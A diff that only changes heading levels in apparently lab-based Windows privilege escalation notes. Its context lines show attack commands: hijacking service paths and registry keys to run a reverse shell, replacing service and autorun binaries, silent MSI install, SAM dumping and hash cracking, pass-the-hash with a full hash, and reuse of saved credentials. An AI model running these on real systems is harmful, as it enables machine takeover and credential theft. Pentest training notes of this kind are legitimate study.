@@ -1,6 +1,6 @@
 # windows - privesc
 
-### generating reverse shell
+## generating reverse shell
 
 ---
 
@@ -36,7 +36,7 @@ On windows:
 C:\PrivEsc\reverse.exe
 ```
 
-### insecure service permissions
+## insecure service permissions
 
 ---
 
@@ -62,7 +62,7 @@ Change binary path name:
 sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
 ```
 
-### unquoted service path
+## unquoted service path
 
 ---
 
@@ -96,7 +96,7 @@ Run service:
 net start unquotedsvc
 ```
 
-### weak registry perms
+## weak registry perms
 
 ---
 
@@ -116,7 +116,7 @@ Overwrite ImagePath registry key to reverse.exe:
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
 ```
 
-### insecure service executables
+## insecure service executables
 
 ---
 
@@ -138,7 +138,7 @@ if it is, you can replace filepermsservice.exe with reverse.exe:
 copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
 ```
 
-### autoruns
+## autoruns
 
 ---
 
@@ -160,11 +160,9 @@ replace program.exe with reverse.exe:
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
 ```
 
-### always install elevated
+## always install elevated
 
----
-
-##### kali
+### kali
 
 check if keys are set to 0x1:
 
@@ -185,7 +183,7 @@ transfer to windows, run this cmd:
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
-##### covenant
+### covenant
 
 Make sure that you have a medium-integrity grunt. 
 
@@ -234,7 +232,7 @@ ls
 shell msiexec /quiet /qn /i file.msi
 ```
 
-### passwords in registry
+## passwords in registry
 
 ---
 
@@ -252,7 +250,7 @@ use winexe to spawn cmd
 winexe -U 'admin%password' //10.10.241.122 cmd.exe
 ```
 
-### saved creds
+## saved creds
 
 ---
 
@@ -268,7 +266,7 @@ on Kali:
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ```
 
-### SAM
+## SAM
 
 ---
 
@@ -284,7 +282,7 @@ python3 creddump7/pwdump.py SYSTEM SAM > hashes.txt
 hashcat -m 1000 --force hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-### pass the hash
+## pass the hash
 
 ---
 
@@ -292,7 +290,7 @@ hashcat -m 1000 --force hashes.txt /usr/share/wordlists/rockyou.txt
 pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.180.131 cmd.exe 
 ```
 
-### autologons
+## autologons
 
 ---
 
@@ -300,7 +298,7 @@ On Covenant:
 
 * Enumerate with `PowerUp.ps1` or `Seatbelt WindowsAutoLogon` to view Autologon credentials
 
-### FODHelper
+## FODHelper
 
 ---
 
